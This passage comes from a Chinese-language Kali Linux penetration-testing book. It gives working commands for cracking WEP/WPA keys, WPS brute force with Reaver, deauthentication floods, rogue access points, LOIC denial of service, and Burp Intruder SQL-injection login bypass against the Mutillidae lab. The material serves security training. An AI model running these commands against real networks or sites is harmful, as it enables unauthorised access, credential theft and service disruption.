  \ `dd_wep` 进行攻击。不需要与应用程序进行任何其他交互；它会自动完成整个破解过程并将破解的密钥保存到数据库中。\n\n![](img/index-236_1.png)\n\
  \n尽管过时的 WEP 漏洞是众周知知的，并已通过 Kali 某些基础工具得到证实，但更强的 WPA 加密协议在攻击面前的表现如何呢？\n\n## 攻击 WPA\
  \ 和 WPA2\n\nWiFi Protected Access (`WPA`) 和 WiFi Protected Access 2 (`WPA2`) 是无线安全协议，旨在解决\
  \ WEP 的安全缺陷。因为 WPA 协议为每个数据包动态生成新密钥，它们防止了导致 WEP 失败的统计分析。尽管如此，它们仍然受到某些攻击技术的威胁。\n\n\
  WPA 和 WPA2 经常使用预共享密钥 (`PSK`) 来保护接入点与无线客户端之间的通信。PSK 应该是一个长度至少 13 个字符的随机密码；如果不是，则可能通过将\
  \ PSK 与已知字典对比，使用暴力破解来确定 PSK。这是常见的攻击方式。（注意，如果配置在企业模式下，即使用 RADIUS 认证服务器提供认证，那么从我们的角度来看，WPA\
  \ 是“不可破解的”！）\n\n#### 暴力破解\n\n与可以使用大量数据包统计分析来破解的 WEP 不同，WPA 解密需要攻击者创建特定类型的包来显示细节，例如接入点与客户端之间的握手。\n\
  \n**[219]**\n\n*利用无线通信攻击*\n\n要攻击 WPA 传输，应执行以下步骤：\n\n1. 启动无线适配器并使用 `ifconfig` 命令确保创建了监听接口（monitor\
  \ interface）。\n2. 使用 `airodump-ng –wlan0` 识别目标网络。\n3. 使用以下命令捕获目标接入点与客户端之间的流量：\n\n\
  ```bash\nroot@kali:~# airodump-ng --bssid 28:10:7B:61:20:32 -c 11 --showack -w dd_wpa2\
  \ wlan0\n```\n\n设置 `-c` 以监控特定通道，使用 `--showack` 标志确保客户端电脑确认了你将其从无线接入点取消认证的请求，并使用\
  \ `-w` 将输出写入文件以便稍后进行字典攻击。该攻击的典型输出如下所示所示：\n\n![](img/index-237_1.png)\n\n4. 保持此终端窗口打开，并在第二个窗口启动取消认证攻击；这将用户重新认证接入点并交换\
  \ WPA 密钥。取消认证命令如下：\n\n```bash\nroot@kali:~# aireplay-ng -0 10 -a 28:10:7B:61:20:32\
  \ -c 00:1D:60:7D:55:5A wlan0\n```\n\n**[220]**\n\n## 第 8 章\n\n执行上述命令如下所示所示：\n\n\
  ![](img/index-238_1.png)\n\n成功的取消认证攻击将显示 ACK，这表明确认了刚刚发送的取消认证命令。\n\n5. 回到最初开启以监控传输的终端窗口，确保捕获到\
  \ 4 次握手。成功的 WPA 握手将在控制器的右上角标识。在以下示例中，数据显示 `28:10:7B:61:20:32`：\n\n![](img/index-238_2.png)\n\
  \n6. 使用 `aircrack` 定义的字典破解 WPA 密钥。攻击者用于收集握手数据的文件将位于根目录，并带有 `-01.cap` 扩展名。\n\n在 Kali\
  \ 中，字典位于 `/usr/share/wordlists` 目录。虽然有多个字典，但建议下载能有效地破解常用密码的列表。\n\n**[221]**\n\n\
  *利用无线通信攻击*\n\n在之前的示例中，密钥被放在密码列表中。根据系统配置，对长密码进行字典攻击可能需要几个小时。以下命令使用单词作为源字典：\n\n```bash\n\
  root@kali:~# aircrack-ng wpa-01.cap /usr/share/wordlists\n```\n\n截图显示了成功破解 WPA 密钥的结果；在测试\
  \ 44 个密钥后，发现网络 `gaffer` 的密钥为 `princessmouse`。\n\n![](img/index-239_1.png)\n\n如果你没有自定义的密码列表，或者想快速生成列表，可以使用\
  \ Kali 中的 `crunch` 。以下命令指示 `crunch` 使用给定的字符集创建一个最小长度为 5 个字符、最大长度为 25 个字符的单词列表：\n\
  \n```bash\nroot@kali:~# crunch 05 25\n```\n\n\n\n\n\n你还可以使用基于 GPU 的密码破解工具（AMD/ATI\
  \ 显卡的 `oclHashcat` 和 NVIDIA 显卡的 `cudaHashcat`）来提高暴力破解的效率。\n\n[222]\n\n# 第 8 章\n\n\
  要实施此攻击，首先使用以下命令将 WPA 握手包文件 `psk-01.cap`  hashcat 文件：\n\n```bash\nroot@kali:~# aircrack-ng\
  \ psk-01.cap -J <output file>\n```\n\n转换完成后，使用以下命令针对新的捕捉文件运行 hashcat（选择与你的 CPU 架构和显卡匹配的\
  \ hashcat 版本）：\n\n```bash\nroot@kali:~# cudaHashcat-plus32.bin -m 2500 <filename>.hccap\
  \ <wordlist>\n```\n\n## 使用 Reaver 攻击无线路由器\nWPA 和 WPA2 也受到针对接入点 Wi-Fi 保护设置（WPS）和\
  \ PIN 码的攻击。\n\n大多数接入点支持 `Wi-Fi Protected Setup`（`WPS`）协议，该协议于 2006 年作为标准出现，允许用户轻松设置和配置接入点，并向现有网络添加新设备，而无需重新输入长且复杂的密码。\n\
  \n遗憾的是，PIN 码是一个 8 位数字（有 100,000,000 种可能），但最后一位是校验和值。由于 WPS 认证协议会将 PIN 码一分为二并分别验证每个部分，这意味着\
  \ PIN 码的前部分有 10⁴（10,000）个值，后部分有 10³（1,000）个可能的值——攻击者最多只需猜测 11,000 次即可破解接入点！\n\n\
  Reaver 是一种旨在最大化猜测过程的工具（尽管 `Wifite` 也会进行 WPS 猜测）。\n\n要开始 Reaver 攻击，使用一个名为 `wash`\
  \ 的辅助工具根据以下命令识别任何漏洞网络：\n\n```bash\nroot@kali:~# wash -i wlan0 --ignore-fcs\n```\n\
  \n如果存在任何漏洞网络，使用以下命令对它们发起攻击：\n\n```bash\nroot@kali:~# reaver -i wlan0 -b (BBSID)\
  \ -vv\n```\n\n在 Kali 中测试此攻击已证明该攻击速度缓慢且容易失败；然而，它可以作为背景攻击使用，或者作为其他攻击路径的补充来破解 WPA 网络。\n\
  \n[223]\n\n# 漏洞利用无线通信\n\n## 克隆接入点\n针对无线网络的较有趣的攻击之一依赖于克隆接入点，然后监控用户尝试连接到它时传输的信息。攻击者不仅可以获取身份验证凭据，还可以利用中间人攻击来拦截或重定向网络流量。\n\
  \nKali 中包含的几个工具声称支持克隆或生成伪造接入点；但目前这些工具仍存在不足。例如，`Social Engineering Toolkit` 和 `Websploit`\
  \ 并没有与 Kali 预装的 DHCP 服务器集成。\n\n大多数攻击者寻找外部工具，包括如 `Gerix` 或 `easy-creds` 等脚本；但 `aircrack-ng`\
  \ 套件也包含一个用于克隆接入点的工具 `airbase-ng`。\n\n要制作伪造的无线接入点，攻击者将：\n\n1. 使用以下命令将 `wlan0` 开启监控模式，这将创建一个用于监控的\
  \ `mon0` 接口：\n\n```bash\nroot@kali:~# airmon-ng start wlan0\n```\n\n2. 使用以下命令在 `mon0`\
  \ 上设置接入点（AP）。社交工程对 AP 的成功有很大影响，因此请使用一个能吸引目标客户端的名称。在本例中，我们将使用一个开放 Wi-Fi 网络的通用名称。它将建立在\
  \ WiFi 的 6 号信道上：\n\n```bash\nroot@kali:~# airbase-ng --essid Customer_Network -c\
  \ 6 mon0\n```\n\n3. 使用以下命令安装桥接工具：\n\n```bash\napt-get install bridge-utils\n```\n\
  \n4. 在另一个终端窗口中，使用桥接工具创建一个网桥（伪造）并将 `at0`（由上一个命令创建）链接到 `eth0`（注意必须先使用 `apt-get install\
  \ bridge-utils` 安装桥接工具）。\n\n```bash\nroot@kali:~# brctl addbr rogue\nroot@kali:~#\
  \ brctl addif rogue at0\nroot@kali:~# brctl addif rogue eth0\n```\n\n[224]\n\n由于两个接口已集成到虚拟网桥中，你可以使用以下命令释放它们的\
  \ IP 地址：\n\n```bash\nroot@kali:~# ifconfig at0 down\nroot@kali:~# ifconfig at0 0.0.0.0\
  \ up\nroot@kali:~# ifconfig eth0 down\nroot@kali:~# ifconfig eth0 0.0.0.0 up\n```\n\
  \n5. 使用以下命令跨网桥启用 IP 转发：\n\n```bash\nroot@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\n\
  ```\n\n6. 使用以下命令为网桥配置连接到 `eth0` 所在的局域网 IP 地址：\n\n```bash\nroot@kali:~# ifconfig\
  \ rogue 10.1.x.y netmask 255.255.255.0 broadcast 10.1.x.255 up\nroot@kali:~# route\
  \ add default 10.1.x.1\n```\n\n7. 使用以下命令启动 AP 来嗅探握手：\n\n```\nairbase-ng -c 6 -e\
  \ file_path/file.cap wlan0\n```\n\n## 拒绝服务攻击\n我们将评估的最后一种攻击是拒绝服务攻击，攻击者以此剥夺合法用户访问网络的权限或使其不可用。无线网络极易受到拒绝攻击的影响，且很难定位攻击者。拒绝攻击的示例包括：\n\
  \n- 向无线网络注入构造的网络命令（如重配置命令）会导致路由器、交换机和其他设备故障。某些设备和应用程序可以识别出攻击正在发生并自动禁用网络。向无线网络泛洪数据包会导致无法使用；例如，对\
  \ Web 服务器发起大量页面请求会耗尽其处理能力。同样地，向网络泛洪认证和关联包会阻止用户连接接入点。\n\n[225]\n\n- 攻击者可以构造特定的取消认证和解除命令，这些命令用于无线网络中关闭授权连接，并通过泛洪网络停止合法用户维持与无线接入点的连接。\n\
  \n为了演示最后一点，我们将通过向网络泛洪取消认证包创建一个拒绝服务攻击。由于无线 802.11 协议设计为在接收定义数据时支持取消认证（以便用户在不再需要时断开连接），这可能是一种破坏性的攻击——它符合标准，且无法阻止。\n\
  \n将合法用户“踢出”网络最简单的方法是针对他们发送取消认证包流。这可以通过 `airplay-ng` 工具套配合以下命令实现：\n\n```bash\nroot@kali:~#\
  \ aireplay-ng -0 0 -a (bssid) -c wlan0\n```\n\n`Websploit` 框架是一个用于扫描和分析远程系统的开源工具。它包含了多个工具，包括针对无线攻击的工具。要启动它，打开命令行\
  \ shell 并直接输入 `websploit`。\n\n`Websplit` 的接口类似于 `recon-ng` 和 `Metasploit Framework`，并为用户提供了一个模块化的界面。\n\
  \n\n\n\n\n启动后，使用 `show modules` 命令查看当前版本中存在的攻击模块。使用 `use wifi/wifi_jammer` 命令选择\
  \ `WiFi jammer`（一组去身份验证数据包）。如下面的截图所示，攻击者只需要使用 `set` 命令设置各种选项，然后选择 `run` 启动攻击。\n\n\
  ![](img/index-243_1.png)\n\n[226]\n\n## 第 8 章\n\n**总结**\n在本章中，我们研究了对无线网络进行成功攻击所需的几项管理任务，包括无线适配器的选择、无线调制解调器的配置以及使用\
  \ `aircrack-ng` 和 `Kismet` 等工具进行侦察。我们重点关注使用 `aircrack-ng` 工具集来识别隐藏网络、绕过 MAC 认证并破解\
  \ WEP 和 WPA/WPA2 加密。我们还看到了如何克隆或复制无线访问点，以及如何对无线网络实施拒绝服务攻击。\n\n下一章将重点介绍攻击者如何针对网站及其服务。我们将检查用于侦察的工具，特别是客户端代理和漏洞扫描器。我们将看到攻击者如何利用自动化工具（如漏洞利用框架和在线密码破解）利用这些漏洞。更重要的是，我们将研究一些通常需要手动干预的离散攻击，如注入攻击和跨站脚本。最后，我们将查看在线服务的特殊之处，以及它们为何以及如何容易受到\
  \ DoS 攻击。\n\n[227]\n\n## 基于 Web 的应用程序侦察与利用\n\n在之前的章节中，我们回顾了攻击者的杀伤链（kill chain）——用于破坏网络和设备、泄露数据或阻碍网络资源访问的具体方法。在`第\
  \ 7 章：《物理攻击与社会工程》`中，我们研究了攻击路径，从物理攻击和社会工程学开始。在`第 8 章：《利用无线通信》`中，我们看到了无线网络是如何被攻破的。在本章中，我们将关注最常见的攻击路径之一：通过网站和基于\
  \ Web 的应用程序。\n\n提供内容和 Web 服务的网站（例如电子邮件和 `FTP`）无处不在，且大多数组织都允许远程访问这些服务并保持几乎持续可用。然而，对于渗透测试人员和攻击者来说，网站暴露了网络上的后端服务、访问网站的用户的客户端活动，以及用户与网站数据之间的连接，这些都是频繁遭受攻击的目标。本章将从攻击者的视角查看网站和\
  \ Web 服务，我们将在`第 10 章：《利用远程访问通信》`中回顾针对连接的攻击，并在`第 11 章：《客户端利用》`中回顾客户端攻击。\n\n### *基于\
  \ Web 的应用程序的侦察与利用*\n\n在本章结束时，你将学习到以下内容：\n\n- 将侦察原理扩展到 Web 服务\n- 漏洞扫描\n- 使用客户端代理\n\
  - 利用 Web 服务中的漏洞\n- 通过 Web 后门维持对被攻系统的访问权限\n\n在许多练习中，我们将使用 `OWASP` 或 `Mutillidae`\
  \ 作为目标网站，这些网站包含可以被利用的已知漏洞；可以从 `www.owasp.org/index.php/ Category:OWASP_Mutillidae`\
  \ 下载。该 Web 应用程序可以可以直接安装在服务器上。有关 `Metasploitable` 的说明，请参考`附录：《安装 Kali Linux》`。\n\n\
  ### 进行网站侦察\n\n网站的复杂性由于几个必须考虑的因素而增加，包括：\n\n- 网络，包括安全控制（IDS/IPS）和蜜罐\n- 平台、操作系统和额外的应用程序\n\
  - 应用程序、中间件和底层数据库\n- 身份验证和授权过程\n- 会话状态\n- 客户端交互和通信\n\n[230]\n\n## 第 9 章\n\n于 Web\
  \ 服务已证明的复杂性，渗透测试人员适应每个站点的参数是非常重要的。同时，测试过程必须一致一致，并确保无遗漏。目前已经提出了几种方法来实现这些目标。最被广泛接受的是**开放\
  \ Web 安全项目** (`OWASP`)（`www.owasp.org`）及其十大 10 漏洞列表。\n\n使用杀伤链方法，某些针对 Web 服务侦察的特定活动重点包括：\n\
  \n- 识别目标站点，特别是关于其托管的位置和方式\n- 列举目标网站的目录结构和文件，包括确定是否使用了**内容管理系统**（`CMS`）。这可能包括下载网站进行离线分析（包括文档元数据分析），以及使用该网站创建用于密码破解的自定义字典列表（使用如\
  \ `crunch` 等程序）。\n- 列举所有表单。由于这些是客户端输入数据并与 Web 服务交互的主要手段，因此它们是若干可利用漏洞的具体位置，例如 SQL\
  \ 注入攻击和跨站脚本。\n- 识别其他接受输入的区域，例如允许上传文件的页面以及对接受的上传类型的任何限制\n- 识别如何处理错误，以及用户收到的实际错误消息；通常，错误会提供价值的内部信息，如所使用的软件版本或内部文件名和进程\n\
  - 确定哪些页面需要并维护安全套接层（SSL）或其他安全协议（参考`第 10 章：《利用远程访问通信》`）。\n\n[231]\n\n\n\n\n第一步是进行前述的被动和主动侦察（参见`第\
  \ 2 章`、`识别目标 – 被动侦察`和`第 3 章`、`主动侦察与漏洞扫描`）；特别是要确保识别出托管的站点，然后使用 DNS 映射识别由同一服务器交付的所有托管站点（最常见且成功的攻击手段之一是攻击托管在与目标网站同一物理服务器上的非目标站点，利用服务器的漏洞获取\
  \ root 权限，然后利用提升的权限攻击目标站点）。\n\n下一步是识别网络防护设备的存在，例如防火墙、`IDS/IPS` 和蜜蜜罐。一种日益常见的防护设备是`Web\
  \ 应用防火墙`（`WAF`）。\n\n如果使用了 `WAF`，测试人员将必须对攻击（特别是那些依赖于精心构造的输入的攻击）进行编码，以绕过 `WAF`。\n\n\
  可以通过手动检查 cookie 来识别 `WAFs`（某些 `WAFs` 会标记或修改 Web 服务器与客户端之间通信的 cookie），或者通过头部信息的更改（当测试人员使用\
  \ `Telnet` 等命令行工具连接到端口 `80` 时可以识别出来）来识别 `WAFs`。\n\n可以使用 `nmap` 脚本 `http-waf-detect.nse`\
  \ 将 `WAF` 检测过程自动化，如后续截图所示：\n\n![](img/index-249_1.png)\n\n`nmap` 脚本识别出存在 `WAF`；然而，对脚本的测试表明，其结果并不总是准确的，且返回的数据可能过于通用，无法指导有效的绕过防火墙策略。\n\
  \n`wafw00f` 脚本是一个用于识别和指纹 Web 防火墙的自动化工具；测试确定它是此目的最准确的工具。该脚本可以从 `Kali` 轻松调用，截图显示了丰富的输出：\n\
  \n**[ 232 ]**\n\n## *第 9 章*\n\n![](img/index-250_1.png)\n\n`负载均衡检测器`(`lbd`) 是一个\
  \ `bash` 脚本，用于确定给定域名是否使用 `DNS` 和/或 `HTTP` 负载均衡。从测试人员的角度来看，这是一个重要信息，因为它可以解释在测试一个服务器而负载均衡器将请求切换到另一个服务器时出现的看似异常的结果。`Lbd`\
  \ 使用多种检查来识别负载均衡的存在；a. 示例输出如下图所示：\n\n![](img/index-250_2.png)\n\n**[ 233 ]**\n\n\
  ## *基于 Web 的应用程序的侦察与利用*\n\n应该检查网站以确定可能用于构建和维护网站的 `CMS`。如 `Drupal`、`Joomla` 和 `WordPress`\
  \ 等 `CMS` 应用程序可能配置了存在漏洞的管理界面，允许访问高权限，或者可能包含可被利用的漏洞。\n\n`Kali` 包含一个自动化扫描器 `BlindElephant`，它可以通过识别\
  \ `CMS` 的指纹来确定版本信息。示例输出如下所示：\n\n![](img/index-251_1.png)\n\n`BlindElephant` 审查 `CMS`\
  \ 组件的指纹，然后对存在的版本提供最佳猜测。然而，与其他应用程序一样，我们发现它可能无法检测到已存在的 `CMS`；因此，请务必通过其他爬取网站特定目录和文件的扫描器来核实结果，或手动检查网站。\n\
  \n一种特定的扫描工具——自动化 Web 爬虫，可以验证已经收集的信息，并确定特定站点的出现有目录和文件结构。Web 爬虫的典型发现包括管理门户、配置文件（当前版本和之前的版本，其中可能包含硬编码的访问凭据和内部结构信息）、网站备份副本、管理员备注、机密个人信息和源代码。\n\
  \n`Kali` 支持多个 Web 爬虫，包括 `Burp Suite`、`DirBuster`、`OWASP-ZAP`、`Vega`、`WebScarab`\
  \ 和 `WebSlayer`。最常用的工具是 `DirBuster`。\n\n**[ 234 ]**\n\n## *第 9 章*\n\n`DirBuster`\
  \ 是一个 GUI 驱动的应用程序，它使用可能的目录和文件列表对网站结构进行暴力破解分析。响应可以用列表或树形格式查看，这种格式能更准确地反映网站结构。针对目标网站执行此应用程序的输出如下所示：\n\
  \n![](img/index-252_1.png)\n\n还可能将网站直接复制到测试人员的所在地。这种“网站克隆”允许测试人员有从容地审查目录结构及其内容，从本地文件中提取元数据，并使用网站内容作为\
  \ `crunch` 等程序的输入，该程序将生成个性化的字典文件以支持密码破解。\n\n要将网站克隆到本地系统，使用 `HTTrack`。如果 `Kali` 中不存在，可以使用\
  \ `apt-get` 命令下载，然后在命令提示符中输入 `httrack` 执行。系统将提示你选择一个目录位置来存储下载的网站。程序执行后，你将获得目标网站的备份。\n\
  \n一旦你映射了交付的网站和/或 Web 服务的基本结构，杀伤链的下一个阶段就是识别可以被利用的漏洞。\n\n**[ 235 ]**\n\n## *基于 Web\
  \ 的应用程序的侦察与利用*\n\n`漏洞扫描器` 使用自动化工具进行漏洞扫描可能会出现问题。Web 漏洞扫描器存在所有扫描器的共同缺点（扫描器只能检测已知漏洞的特征；它们无法判断漏洞是否可以被利用；存在高误报率）。此外，Web\
  \ 漏洞扫描器无法识别复杂的逻辑错误，也无法准确模拟黑客使用的复杂攻击。\n\n为了增加可靠性，大多数渗透测试使用多个工具扫描 Web 服务；当多个工具报告存在某个漏洞时，这种共识将引导测试人员去手动核实结果。\n\
  \n\n\n\n- 扩展非传统应用程序（如 Web 浏览器）功能以支持 Web 服务漏洞扫描的扫描器（OWASP Mantra）\n- 专门用于支持网站和 Web\
  \ 服务侦察及漏洞检测的扫描器（`Arachnid`、`Nikto`、`Skipfish`、`Vega`、`w3af` 等）\n\n### 扩展传统漏洞扫描器的功能\n\
  此类漏洞扫描器的最佳示例是 `Rapid7` 的 `Metasploit Framework` 中封装的 `wmap` 模块。要使用此模块，必须先确保 `postgresql`\
  \ 数据库服务已启动；请使用以下命令：\n\n```bash\nroot@kali:~# service postgresql start\n```\n\n接下来，从命令行提示符启动\
  \ `msfconsole` 并输入 `load wmap` 命令。与该框架大多数应用程序一样，在命令行提示符中输入 `help` 或 `-h` 将显示可用的命令。\n\
  \n要管理目标站点，请使用 `wmap_sites` 命令。`-a` 选项会将目标的 IP 地址添加到应用程序数据库中。`-l` 选项将提供可测试的可用站点列表，如下截图所示：\n\
  \n![](img/index-254_1.png)\n\n选择目标后，测试人员现在可以使用以下命令运行 `wmap` 模块：\n\n```bash\nmsf>\
  \ wmap_run –e\n```\n\n[237]\n\n上一条命令的执行结果如下所示：\n\n![](img/index-255_1.png)\n\n执行此命令可能需要一些时间才能完成（这取决于网站的页面数量、站点的结构复杂度，以及所选模块检测漏洞的工作方式）。\n\
  \n`Metasploit Framework` 并不是为网站和 Web 服务的复杂性而设计的；从使用该产品与使用专门为网站和 Web 服务设计的漏洞扫描器相比，其发现的结果有限可以看出这一点。尽管如此，因为它不断更新，监控其扫描能力的变化仍然是有值的。\n\
  \n`Websploit` 应用程序也使用了 `wmap` 模块。\n\n### 扩展 Web 浏览器的功能\nWeb 浏览器的设计目的是与 Web 服务交互。因此，它们被选为漏洞评估和利用工具是自然而。\n\
  \n此类工具集的最佳示例是 `OWASP` 的 `Mantra`——这是一个基于 `Firefox` Web 浏览器构建的第三方安全工具集。`OWASP` 的\
  \ `Mantra` 支持 Windows、Linux 和 Macintosh 测试系统，并提供了支持以下活动的工具访问：\n\n- **信息收集**：这些工具提供被动侦察，报告目标的物理位置，揭示底层站点技术，并对站点超链接进行搜索和测试\n\
  \n[238]\n\n- **编辑器**：用于编辑、调试和监控 HTML、CSS 和 JavaScript 的工具集\n- **代理**：提供代理管理工具的程序，包括\
  \ `FoxyProxy`，一种便于在不同代理之间来切换的工具\n- **网络工具**：这些工具提供了 `FTP` 和 `SSH` 通信客户端，并简化了 `DNS`\
  \ 缓存管理\n- **应用程序审计**：这些工具可以在不同的用户代理之间切换，访问 Web 开发者工具，并按站点控制发送的 `HTTP` 引用来源\n- **杂项**：这些工具生成脚本、管理会话并允许加密\n\
  \n## 第 9 章\n\n上一条命令的执行结果如下所示：\n\n![](img/index-256_1.png)\n\n[239]\n\n### 基于 Web\
  \ 的应用程序的侦察与利用\n\n\n\n\n\n根据发现的已验证漏洞数量，最有效的扫描器之一是 Subgraph 的 `Vega`。如下截图所示，它会扫描目标并将漏洞分类为高、中、低或信息。测试人员可以点击已识别的结果以“下钻”到特定的发现项。测试人员还可以修改用\
  \ `Java` 编写的搜索模块，以关注特定的漏洞或识别新的漏洞。\n\n![](img/index-259_1.png)\n\n另一个值得使用的扫描器是“Web\
  \ 应用程序攻击与审计框架”（`Web Application Attack and Audit Framework`，简称 `w3af`），这是一个基于 `Python`\
  \ 的开源 Web 应用程序安全扫描器。它提供了预配置的漏洞扫描，以支持 `OWASP` 等标准。扫描器选项的广泛性是有代价的——它审查目标所需的时间比其他扫描器长得多，而且在长时间的测试期间容易失败。下面的截图显示了配置用于对示例网站进行完整审计的\
  \ `w3af` 实例：\n\n**[ 242 ]**\n\n# 第 9 章\n\n![](img/index-260_1.jpg)\n\nKali 还包含了一些针对特定应用程序的漏洞扫描器。例如，`WPScan`\
  \ 专门用于 `WordPress CMS` 应用程序。\n\n## 使用客户端代理进行安全性测试\n\n与自动化漏洞扫描器不同，客户端代理需要大量的人机交互才能生效。客户端代理拦截\
  \ `HTTP` 和 `HTTPS` 流量，允许渗透测试人员检查用户与应用程序之间的通信。它允许测试人员复制数据或与发送到应用程序的请求进行交互。\n\nKali\
  \ 自带多个客户端代理，包括 `Burp Suite`、`OWASP ZAP`、`Paros`、`ProxyStrike`、漏洞扫描器 `Vega` 以及 `WebScarab`。经过广泛测试，我们习惯使用\
  \ `Burp Proxy`，并将 `ZAP` 作为备用工具。\n\n**[ 243 ]**\n\n## Web 应用程序的侦察与利用\n\nBurp 主要用于拦截\
  \ `HTTP(S)` 流量；然而，它是更大的工具套件的一部分，具有多个额外功能，包括：\n\n- 能够爬取网站的应用程序感知爬虫\n- 漏洞扫描器，包括用于测试会话令牌随机性的\
  \ `sequencer`（排序器），以及用于在客户端和网站之间操控并重发请求的 `repeater`（重放器）（Kali 软件包中自带的 `Burp proxy`\
  \ 免费版不包含漏洞扫描器）\n- 可用于自定义攻击的 `intruder`（入侵者）工具（Kali 包含的工具免费版有速度限制；购买该软件的商业版后将移除这些限制）\n\
  - 编辑现有插件或编写新插件的能力，以扩展可用攻击的数量和类型\n\n要使用 `Burp`，请确保你的 浏览器配置为使用本地代理；通常，你需要调整网络设置，指定\
  \ `HTTP` 和 `HTTPS` 流量必须使用端口 `8080` 的 `localhost` (`127.0.0.1`)。\n\n在设置好浏览器和代理协同工作后，手动映射应用程序。这通过关闭代理拦截然后浏览整个应用程序来实现。遵循每一个链接，提交表单，并尽可能登录网站的多个区域。额外的内容将从各种响应中推断出来。站点将填充\
  \ `Target`（目标）标签页下的区域（可以通过右键点击网站并选择 `Spider This Host` 来使用自动爬取；然而，手动技术让测试人员有机会深入熟悉目标，并可能识别出需要避开的区域）。\n\
  \n一旦映射了目标，通过选择站点地图中的分支并使用 `Add to Scope`（添加到范围）命令来定义 `Target – Scope`（目标——范围）。完成后，你可以使用显示过滤器隐藏站点地图上你不感兴趣的项目。下面的截图显示了目标网站创建的站点地图：\n\
  \n**[ 244 ]**\n\n# 第 9 章\n\n![](img/index-262_1.jpg)\n\n爬取完成后，手动检查目录和文件列表，查看任何看起来不属于公共网站或似乎是无意泄露的结构。例如，标题为\
  \ `admin`、`backup`、`documentation` 或 `notes` 的目录应该进行手动检查。\n\n使用单引号作为输入对登录页面进行手动测试产生了一个错误代码，表明它可能受到\
  \ `SQL injection`（SQL 注入）攻击；错误代码的示例返回如下所示：\n\n![](img/index-262_2.png)\n\n**[ 245\
  \ ]**\n\n## Web 应用程序的侦察与利用\n\n代理真正的实力在于拦截和修改命令的能力。对于这个特定的示例，我们将使用 `Mutillidae` 网站——这是一个“有漏洞”的站点，作为\
  \ `Metasploitable` 测试框架的一部分进行的，用于执行攻击以绕过 `SQL injection` 认证。\n\n要启动此攻击，请确保 `Burp\
  \ proxy` 配置为拦截通信，进入 `Proxy` 标签页并选择 `Intercept`（拦截）子标签页。点击 `Intercept is on` 按钮，如下一截图所示。完成后，打开浏览器窗口并通过输入\
  \ `/mutillidae/index.php?page=login.php` 访问 Mutillidae 登录页面。在用户名和密码字段输入变量，然后点击登录按钮。\n\
  \n如果你返回 `Burp proxy`，你将看到用户在网页表单中输入的信息已被拦截。\n\n![](img/index_263_1.png)\n\n**[ 246\
  \ ]**\n\n# 第 9 章\n\n点击 `Action` 按钮并选择 `Send to Intruder`（发送到入侵者）。打开 `Intruder` 主标签，你会看到四个子标签页——`Target`、`Positions`、`Payloads`\
  \ 和 `Options`，如下所示。如果你选择 `Positions`，你会看到从拦截信息中识别出的五个位置。\n\n![](img/index-264_1.png)\n\
  \n此攻击将使用代理的 `sniper`（狙击手）模式，该模式从人员提供的列表中获取单个输入，并将其发送到单个负载位置。对于此示例，我们将针对用户名字段，根据返回的错误信息我们怀疑其存在漏洞。\n\
  \n**[ 247 ]**\n\n## Web 应用程序的侦察与利用\n\n要定义负载位置，我们选择 `Payloads` 子标签页。\n\n![](img/index-265_1.png)\n\
  \n要启动攻击，从顶部菜单选择 `Intruder`，然后选择 `Start Attack`（开始攻击）。代理将针对选定的负载位置迭代列表执行合法的 `HTTP`\
  \ 请求，并返回服务器的状态码。如截图所示，大多数选项产生 `200` 状态（请求成功）；然而，某些数据返回 `302` 状态（找到；表示请求的资源目前位于另一个\
  \ URI）。\n\n**[ 248 ]**\n\n# 第 9 章\n\n![](img/index-266_1.png)\n\n`302` 状态表示攻击成功，获得的数据可用于成功登录目标站点。\n\
  \n遗憾的是，这对 `Burp proxy` 及其能力的概述太简短了。Kali 自带的免费版本可以满足许多测试任务；然而，严肃的测试人员（和攻击者）应该考虑购买商业版本。\n\
  \n**[ 249 ]**\n\n## Web 应用程序的侦察与利用\n\n**服务器利用** 由于它们拥有广泛的“攻击面”（通信通道、客户端软件、服务器操作系统、应用程序、中间件和后端数据库），Web\
  \ 服务受到多种攻击类型。可能的攻击范围需要专门的一本书；因此，我们将仅展示几种类型以突显 Kali 的能力。\n\n\n\n\n在本示例中，我们将演示如何使用\
  \ Kali 对网络服务器发起拒绝服务（`DoS`）攻击。通常情况下，攻击提供 Web 服务的主机系统的操作系统遵循之前描述的方法论；然而，它们的架构对 `DoS`\
  \ 攻击特别为脆弱。\n\nKali 包含了几个被描述为压力测试程序的工具，因为它们通过模拟针对服务器的高活动负载，来评估其应对额外压力的能力。如果服务器或其应用程序故障，则说明它遭受了\
  \ `DoS` 攻击。\n\n许多工具依赖 IPv4 系统无法处理较新的 `IPv6` 协议（`denail6`、`dos-new-ip6`、`flood_advertise6`\
  \ 等）。\n\n然而，最成功的 `DoS` 攻击工具——低轨道离子炮（`LOIC`）必须通过以下步骤手动添加到 Kali 中：\n\n1. 使用 `apt-get\
  \ install` 命令安装以下包及其依赖项：`mono-gmcs`、`mono-mcs`、`monodevelop` 和 `liblog4net-cil-dev`。\n\
  2. 从 GitHub (`https://github.com/NewEraCracker/LOIC/downloads`) 下载 `LOIC` 到单独的文件夹。使用\
  \ `unzip` 命令将压缩文件解压到文件夹中。\n3. 进入该文件夹并使用以下命令编译应用程序：\n```bash\nmdtool build\n```\n\
  4. 应用程序的编译构建位于 `/bin/Debug/LOIC.exe` 目录。\n\n[ 250 ]\n\n## 第 9 章\n\n一旦输入了攻击参数，就可以针对目标网站启动\
  \ `LOIC`。攻击通过直观的 GUI 界面发起，如下截图所示：\n\n![](img/index-268_1.jpg)\n\n### 针对特定应用程序的攻击\n\
  针对应用程序的攻击多于针对特定操作系统的攻击；当考虑到影响每个在线应用程序的配置错误、漏洞和逻辑错误时，任何应用程序都能被认为是“安全的”，这是令人惊讶的。我们将重点介绍一些针对\
  \ Web 服务的更重要的攻击。\n\n### 暴力破解访问凭据\n针对网站或服务最常见的初始攻击之一是对访问身份验证的暴力破解——猜测用户名和密码。这种攻击的成功率很高，因为用户倾向于选择易记的凭据或重复使用凭据，而且因为系统管理员经常不限制多次访问尝试。\n\
  \n[ 251 ]\n\n### Web 应用程序的侦察与利用\nKali 带有一个命令行工具 `hydra` 以及具有 GUI 界面的 `hydra-gtk`。这两个工具都允许测试人员针对指定的服务暴力破解或迭代可能的用户名和密码。支持多种通信协议，包括\
  \ `FTP`、`FTPS`、`HTTP`、`HTTPS`、`ICQ`、`IRC`、`LDAP`、`MySQL`、`Oracle`、`POP3`、`pcAnywhere`、`SNMP`、`SSH`、`VNC`\
  \ 等。以下截图显示 `hydra` 使用暴力破解确定 `HTTP` 页面的访问凭据：\n\n![](img/index-269_1.png)\n\n### 数据库注入攻击\n\
